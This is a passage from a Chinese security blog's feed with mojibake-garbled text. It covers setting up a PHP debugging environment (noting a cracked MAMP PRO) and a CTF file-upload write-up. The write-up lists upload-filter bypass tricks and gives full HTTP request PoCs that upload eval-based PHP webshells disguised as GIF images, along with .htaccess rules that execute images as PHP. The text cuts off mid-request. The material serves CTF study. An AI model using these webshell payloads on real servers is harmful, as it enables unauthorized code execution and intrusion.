è°ƒè¯•åˆ†æï¼Œæ€»ä¹‹ï¼Œèƒ½å­¦åˆ°ä¸œè¥¿å°±è¡Œã€‚å­¦åˆ°äº†æ€è·¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¤ç°thinkphp çš„å†å²æ¼æ´ï¼Œå’Œthinkcmf æˆ–è€…å…¶ä»–phpæ¡†æ¶çš„å†å²æ¼æ´ï¼Œå­¦ä¹ å®Œä¹‹åå°±å»æ‰¾cmsè¿›è¡Œå®æˆ˜ï¼ï¼ˆå…¶å®è¿™ä¸ªå·²ç»æç½®äº†å¿«åŠå¹´äº†ã€‚</p><blockquote><p>ä¸€ä¸ªä¸èƒ½å­œå­œä¸å€¦ï¼Œå§‹ç»ˆå¤„äºæ–°çŸ¥è¯†ã€æ–°æŠ€æœ¯å­¦ä¹ çŠ¶æ€ä¸‹çš„å®‰å…¨çˆ±å¥½è€…ï¼Œå¿…ç„¶ä¼šè¢«è¶…è¶Šå’Œå–ä»£ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>MacOS ä¸‹é…ç½®PHPä»£ç å®¡è®¡ç¯å¢ƒï¼ŒPHPè°ƒè¯•å­¦ä¹ </title>
    <link href="https://hack-for.fun/4fd81e40.html"/>
    <id>https://hack-for.fun/4fd81e40.html</id>
    <published>2020-09-11T12:34:13.000Z</published>
    <updated>2020-09-11T15:56:23.844Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç¯å¢ƒé…ç½®å‚è€ƒæ–‡ç« ï¼š<a href="https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2">https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2</a></p><blockquote><p>æ‰€éœ€Appï¼š</p><p>MAMP PRO ï¼Œæˆ‘æ˜¯åœ¨Google é‡Œæ‰¾çš„Cracked Version</p><p>PHPStorm / Vscode</p></blockquote><p>MAMP ä¸­çš„ <code>php.ini</code> è®¾ç½®</p><p>åœ¨åˆ‡æ¢phpç‰ˆæœ¬æ—¶éœ€æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œå…å¾—debug ç¯å¢ƒå‡ºé”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable&#x3D;1</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_autostart&#x3D;1</span><br><span class="line">xdebug.profiler_enable&#x3D;0</span><br><span class="line">xdebug.profiler_output_dir&#x3D;&quot;&#x2F;Applications&#x2F;MAMP&#x2F;tmp&quot;</span><br><span class="line">xdebug.idekey&#x3D;&quot;my_key&quot;</span><br></pre></td></tr></table></figure><p>å‡ºç°ä¸‹å›¾çš„æƒ…å†µï¼Œè¯´æ˜Debug é…ç½®æ­£å¸¸ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911203443.png" alt="image-20200911203438853"></p><hr><blockquote><p>æ¨èå°†æ•´ä¸ªä»£ç å®¡è®¡çš„è·¯å¾„è®¾ç½®æˆProject, æ¯”å¦‚:  xxx/www/xxx</p><p>ç„¶åMAMP å’Œ PhpStorm çš„è®¾ç½®è¦ä¸€è‡´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222248.png" alt="image-20200911204652392"></p><h1 id="å•ä¸ªæ–‡ä»¶è°ƒè¯•"><a href="#å•ä¸ªæ–‡ä»¶è°ƒè¯•" class="headerlink" title="å•ä¸ªæ–‡ä»¶è°ƒè¯•"></a>å•ä¸ªæ–‡ä»¶è°ƒè¯•</h1><p>æµ‹è¯•Debug æ˜¯å¦æˆåŠŸï¼šåœ¨ç¬¬å››è¡Œï¼Œå˜é‡å­—ç¬¦ä¸²æ‹¼æ¥çš„åœ°æ–¹ï¼Œä¸‹ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•ã€‚ç»“æœå¦‚å›¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222425.png" alt="image-20200911205830698"></p><h1 id="æ•´ä¸ªæ–‡ä»¶å¤¹-ç½‘ç«™ç›®å½•-è°ƒè¯•"><a href="#æ•´ä¸ªæ–‡ä»¶å¤¹-ç½‘ç«™ç›®å½•-è°ƒè¯•" class="headerlink" title="æ•´ä¸ªæ–‡ä»¶å¤¹(ç½‘ç«™ç›®å½•)è°ƒè¯•"></a>æ•´ä¸ªæ–‡ä»¶å¤¹(ç½‘ç«™ç›®å½•)è°ƒè¯•</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222559.png" alt="image-20200911210726371"></p><blockquote><p>å…³é”®æ˜¯é€‰æ‹©ä¸‹é¢çš„Server å³å¯ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222713.png" alt="image-20200911210857642"></p><p>PHPMyadmin éœ€è¦php  5.5+ , cms å®‰è£…æ—¶ï¼Œæ•°æ®åº“åœ¨phpmyadmin ä¸­åˆ›å»ºå³å¯ã€‚</p><p>è¿™é‡Œä»¥å›½å…‰å¸ˆå‚…æ–‡ç« çš„cmsï¼Œåå°è¯­è¨€è®¾ç½®GetShellï¼Œæ¥æµ‹è¯•ã€‚</p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36">https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36</a></p><p>åœ¨ 149 è¡Œä¸‹æ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222146.png"></p><p>å¯ç›´æ¥åœ¨<code>$lang_text</code> ä¸­ä¿®æ”¹å€¼å³å¯è¿›è¡Œè°ƒè¯•ã€‚</p><p>Burp Suite æŠ“åŒ…çš„è¯·æ±‚åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222725.png" alt="image-20200911220557034"></p><h1 id="æ–‡ä»¶ç›‘æ§"><a href="#æ–‡ä»¶ç›‘æ§" class="headerlink" title="æ–‡ä»¶ç›‘æ§"></a>æ–‡ä»¶ç›‘æ§</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222737.png" alt="image-20200911213334993"></p><h1 id="MySQL-ç›‘æ§"><a href="#MySQL-ç›‘æ§" class="headerlink" title="MySQL ç›‘æ§"></a>MySQL ç›‘æ§</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222752.png" alt="image-20200911214143396"></p><p>éœ€è¦ä¿®æ”¹<code>config.ini</code> ä¸­çš„æ•°æ®åº“ä¸ºä¹‹å‰cms åˆ›å»ºçš„æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[dbconf]</span><br><span class="line">host&#x3D;localhost</span><br><span class="line">port&#x3D;8889</span><br><span class="line">user&#x3D;root</span><br><span class="line">password&#x3D;root</span><br><span class="line">db_name&#x3D;test</span><br><span class="line">charset&#x3D;utf8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222811.png" alt="image-20200911214903921"></p><p>ä½¿ç”¨DataGrip è¿æ¥MySQL æ—¶çš„ç›‘æ§æ—¥å¿—</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223609.png" alt="image-20200911215237610"></p><h2 id="DataGrip-è¿æ¥æ•°æ®åº“"><a href="#DataGrip-è¿æ¥æ•°æ®åº“" class="headerlink" title="DataGrip è¿æ¥æ•°æ®åº“"></a>DataGrip è¿æ¥æ•°æ®åº“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222823.png" alt="image-20200911215449398"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223553.png" alt="image-20200911215526972"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223540.png" alt="image-20200911215342544"></p><h1 id="VsCode-é…ç½®"><a href="#VsCode-é…ç½®" class="headerlink" title="VsCode é…ç½®"></a>VsCode é…ç½®</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911234844.png" alt="image-20200911234023142"></p><p>VScode å•æ­¥è°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911235149.png" alt="image-20200911233946444"></p><p>ç»ˆäºä¼šè°ƒè¯•äº†~ </p><p>ä¸‹ä¸€æ­¥å°±æ˜¯å»å®Œæ•´ä»£ç å®¡è®¡ä¸€ä¸‹è¿™ä¸ªCMS~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ç¯å¢ƒé…ç½®å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.sqlsec.com/2020/07/</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTF - æ–‡ä»¶ä¸Šä¼ </title>
    <link href="https://hack-for.fun/103ec22a.html"/>
    <id>https://hack-for.fun/103ec22a.html</id>
    <published>2020-08-30T13:01:05.000Z</published>
    <updated>2020-08-31T02:25:04.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´æŠ€æœ¯ç‚¹</h1><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/">http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</a></p></blockquote><p>CheckFile åˆ†ä¸ºCå‰ç«¯å’ŒSåç«¯ï¼š</p><ul><li>å‰ç«¯ç»•è¿‡ç›´æ¥BP æŠ“åŒ…å°±å¯ä»¥äº† ã€æˆ–è€…åœ¨æµè§ˆå™¨çš„Console é‡Œå°†CheckFile() å‡½æ•°ç½®ç©ºï¼ˆç›¸å½“äºåˆ é™¤ã€‚</li><li>åç«¯æ£€æµ‹ä¸»è¦é’ˆå¯¹æ–‡ä»¶åç¼€ï¼Œæ–‡ä»¶å†…å®¹ï¼Œä»¥åŠContent-Typeï¼ŒMIMI-Type ï¼Œè¾ƒéš¾çš„æœ‰äºŒæ¬¡æ¸²æŸ“ï¼Œæ•°ç»„ç»•è¿‡ï¼Œé€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ç»•è¿‡ï¼Œç•¸å½¢è§£æã€‚</li></ul><h2 id="å¯è§£æåç¼€"><a href="#å¯è§£æåç¼€" class="headerlink" title="å¯è§£æåç¼€"></a>å¯è§£æåç¼€</h2><p>CTFæ–‡ä»¶ä¸Šä¼ é¢˜ä¸­å¸¸ç”¨çš„phpæ‹“å±•å:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200830214608.png" alt="image-20200830213958438"></p><ul><li>åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨</li><li>ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æï¼ˆ <strong>.user.ini é€‚ç”¨æ€§æ›´å¹¿</strong>ï¼Œåè€…åªèƒ½ç”¨äºApache</li></ul><blockquote><p>.user.ini  å’Œ .htaccess ä¸­çš„å°æŠ€å·§</p><p><code>\</code> å¯ç”¨äºæ¢è¡Œï¼Œå¸¸å¸¸å‡ºç°åœ¨ä¸€äº›éé¢„æœŸä¸­ã€‚</p><p>è¿˜å¯ä»¥é€šè¿‡é‡å†™è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¹å˜ç¼–ç (UTF-7)æ¥ç»•è¿‡ï¼Œè¾ƒå¤æ‚ã€‚</p><p>.htaccess ä¸­ <code>#</code> å¯ç”¨äºæ³¨é‡Šã€‚</p><p>æ–‡ä»¶åŒ…å«<code>.htaccess</code> è¯»å–é…ç½®ï¼Œç„¶åè®¿é—®å…¶ä¸­çš„é“¾æ¥ã€‚</p></blockquote><ul><li>%00æˆªæ–­ç»•è¿‡</li><li>php3</li><li>php4</li><li>php5</li><li>php7</li><li>phtml</li><li>phps</li><li>pht</li><li>Windows ADSæµç‰¹æ€§ ::$DATA</li><li>Windows æ–‡ä»¶åç‰¹æ€§ï¼Œåç¼€ååŠ ç©ºæ ¼ï¼ŒåŠ å…¶ä»–å­—ç¬¦ã€‚</li></ul><h2 id="ç³»ç»Ÿç‰¹æ€§"><a href="#ç³»ç»Ÿç‰¹æ€§" class="headerlink" title="ç³»ç»Ÿç‰¹æ€§"></a>ç³»ç»Ÿç‰¹æ€§</h2><ul><li>Windowsä¸‹æ–‡ä»¶åä¸åŒºåˆ†å¤§å°å†™ï¼ŒLinuxä¸‹æ–‡ä»¶ååŒºåˆ†</li><li>Windowsä¸‹ADSæµç‰¹æ€§ï¼Œå¯¼è‡´ä¸Šä¼ æ–‡ä»¶xxx.php::$DATA = xxx.php</li><li>Windowsä¸‹æ–‡ä»¶åç»“å°¾åŠ å…¥<code>.</code>,<code>ç©ºæ ¼</code>,<code>&lt;</code>,Â·<code>&gt;</code>,<code>&gt;&gt;&gt;</code>,<code>0x81-0xff</code>ç­‰å­—ç¬¦ï¼Œæœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶å‡è¢«windowså¿½ç•¥ã€‚</li></ul><h2 id="ä¸­é—´ä»¶"><a href="#ä¸­é—´ä»¶" class="headerlink" title="ä¸­é—´ä»¶"></a>ä¸­é—´ä»¶</h2><ul><li>iis</li></ul><p>iisä¸€å…±æœ‰ä¸‰ä¸ªè§£ææ¼æ´ï¼š</p><p>1.IIS6.0æ–‡ä»¶è§£æ xx.asp;.jpg<br>2.IIS6.0ç›®å½•è§£æ xx.asp/1.jpg<br>3.IIS 7.0ç•¸å½¢è§£æ xxx.jpg/x.asp</p><ul><li>apache</li></ul><ol><li>%0a(CVE-2017-15715)</li><li>æœªçŸ¥åç¼€ test.php.xxx</li></ol><ul><li>nginx</li></ul><ol><li>è®¿é—®è¿æ¥åŠ /xxx.php test.jpg/xxx.php</li><li>ç•¸å½¢è§£ææ¼æ´ test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(éç¼–ç ç©ºæ ¼)\0x.php</li></ol><ul><li>tomcat</li></ul><p>tomcatç”¨äºä¸Šä¼ ç»•è¿‡çš„æœ‰ä¸‰ç§,ä¸è¿‡é™åˆ¶åœ¨windowsæ“ä½œç³»ç»Ÿä¸‹ã€‚</p><ol><li>xxx.jsp/</li><li>xxx.jsp%20</li><li>xxx.jsp::$DATA</li></ol><h2 id="æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘"><a href="#æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘" class="headerlink" title="æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘"></a>æ¡†æ¶ç‰¹æ€§ã€ç¨‹åºé€»è¾‘</h2><p>æ¯”å¦‚ï¼š</p><ul><li><p>ThinkPHP çš„å¤šæ–‡ä»¶ä¸Šä¼ é€»è¾‘</p></li><li><p>ç¨‹åºé€»è¾‘ï¼šå¤§èƒ†å°è¯•ã€‚ï¼ˆæœ‰äº›æ˜¯å‡½æ•°ä½¿ç”¨ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´äº†ç»•è¿‡</p></li><li><p>æ¡ä»¶ç«äº‰</p></li></ul><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>JSç»•è¿‡å¯¹&lt;?php çš„æ£€æµ‹</li><li>Content-Type ç»•è¿‡</li><li>å¸¸è§å¯è§£æåç¼€bypass</li></ul><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload_file.php HTTP&#x2F;1.1</span><br><span class="line">Host: 77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn</span><br><span class="line">Content-Length: 354</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;basic_php_webshell.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Webshell åœ°å€ï¼šurl/upload/webshell.php  è¿æ¥å¯†ç ä¸ºAã€‚</p><p>è·å–flagï¼šè™šæ‹Ÿç»ˆç«¯æ‰§è¡Œ <code>cat /flag</code></p><p>åç«¯ä¼ªä»£ç å¯èƒ½ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/&lt;?/i&#x27;</span>,flie_get_contents($upload_file));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no &lt;?&quot;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/|php|pht|phtm|...|/i&#x27;</span>,file_extension);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>å‰ç«¯æ ¡éªŒbypassï¼ˆé€šè¿‡BurpSuite æŠ“åŒ…</li><li>å¸¸è§å¯è§£æåç¼€bypass</li></ul><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn</span><br><span class="line">Content-Length: 338</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;basic_php_webshell.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel--</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>æŠ€æœ¯ç‚¹ï¼š</p><ul><li>.htaccess é‡å†™ç»•è¿‡é»‘åå•è§£æGetShell</li><li>Content-Type Bypass</li><li>&lt;? Bypass</li></ul><p>ä¸Šä¼ .htaccess</p><ul><li>ä½¿ <code>png</code> æ–‡ä»¶è§£æä¸º<code>php</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application&#x2F;x-httpd-php    .png</span><br></pre></td></tr></table></figure><ul><li>å°†æ‰€æœ‰æ–‡ä»¶è§£æä¸º<code>php</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><ul><li><code>.htaccess</code>ç•™åé—¨ï¼Œæ·»åŠ phpè§£æè§„åˆ™ï¼Œæ–‡ä»¶ååŒ…å«1åˆ™è§£æä¸ºphp</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn</span><br><span class="line">Content-Length: 359</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: PHPSESSID&#x3D;ae2f4a4366a5ea0ece393127ad9b864e</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;basic_php_webshell.png&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script 